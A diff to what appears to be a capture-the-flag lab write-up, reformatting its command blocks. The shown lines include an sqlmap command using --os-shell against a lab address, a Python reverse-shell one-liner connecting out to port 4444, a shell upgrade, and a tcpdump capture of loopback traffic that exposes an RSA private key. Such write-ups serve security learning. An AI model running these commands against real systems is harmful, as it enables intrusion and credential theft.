@@ -40,11 +40,11 @@ webapp.ini
 
 door = opened
 ```
-
 ### Exploit the sql database to got a shell as rick
 
-sqlmap -u http://10.10.250.34/door/config.php --level 5 --risk 3 --batch -D db --os-shell --forms
 ```bash
+sqlmap -u http://10.10.250.34/door/config.php --level 5 --risk 3 --batch -D db --os-shell --forms
+
 > python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.37.214",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -58,9 +58,9 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ## Privilege Escalation
 
 ### linpeas = tcpdump
-
-tcpdump -i lo -w file.cap
 ```bash
+tcpdump -i lo -w file.cap
+
 cat file.cap :
 
 -----BEGIN RSA PRIVATE KEY-----
